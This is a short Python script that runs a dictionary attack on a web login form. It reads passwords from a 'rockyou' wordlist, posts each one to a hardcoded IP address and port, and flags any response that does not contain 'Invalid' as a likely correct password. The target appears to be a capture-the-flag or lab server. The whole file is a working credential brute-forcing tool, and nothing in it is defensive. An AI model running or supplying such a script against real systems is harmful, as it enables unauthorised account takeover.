import requests
import re

def forcedict(url, field, dictpath, pattern_comp):
    with open(dictpath) as _dict:
        payload = { field : "" }
        while True:
            line = _dict.readline().strip()
            if not line: 
                return None
            print("trying password: ", line, end = "")
            payload[field] = line

            resp = requests.post(url, data = payload)
            #if resp.status_code == 200:
            data = re.match(pattern_comp, resp.content)
            if data:
                print("password: {} was wrong".format(line))
            else:
                print("\n------------------------------\nCHECK THIS OUT: {}\n------------------------------".format(line))
                input("continue?")

if __name__ == "__main__":
    forcedict("http://88.198.233.174:37417/", "password", "/mnt/d/_root/data/rockyou", b"Invalid")